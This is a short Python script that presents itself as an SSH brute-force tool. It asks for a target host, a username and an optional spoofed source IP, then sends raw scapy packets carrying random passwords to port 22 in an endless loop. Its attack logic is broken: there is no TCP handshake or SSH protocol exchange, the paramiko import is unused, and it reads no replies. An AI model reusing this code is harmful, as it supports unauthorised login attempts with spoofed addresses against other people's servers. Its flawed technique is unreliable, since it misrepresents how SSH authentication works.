import socket
import paramiko
import random
import string
import time
from scapy.all import *

def generate_random_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

def send_ssh_packet(destination, source, username, password):
    packet = IP(src=source, dst=destination)/TCP(dport=22)/Raw(load=f"{username}\r\n{password}\r\n")
    send(packet, verbose=0)

def get_local_ip():
    try:
        # Create a socket to determine the local IP address
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 80))  # Connect to a known external server
            local_ip = s.getsockname()[0]
        return local_ip
    except Exception as e:
        print(f"Error getting local IP address: {e}")
        return None

def get_user_input():
    hostname = input("Enter the hostname or IP address of the SSH server: ")
    username = input("Enter the username: ")
    source_ip = input(f"Enter the source IP address (leave blank for default, your local IP address is {get_local_ip()}): ")
    return hostname, username, source_ip

if __name__ == "__main__":
    hostname, username, source_ip = get_user_input()

    while True:
        if source_ip == "":
            source_ip = get_local_ip()  # Set source IP to local IP for default behavior

        password = generate_random_password()
        try:
            send_ssh_packet(hostname, source_ip, username, password)
            print(f"SSH packet sent with source IP {source_ip or 'default'} and password: {password}")
        except Exception as e:
            print(f"Failed to send SSH packet with password: {password}, Error: {e}")
        
        time.sleep(1)  # Adjust sleep time as needed to control the rate of connection attempts
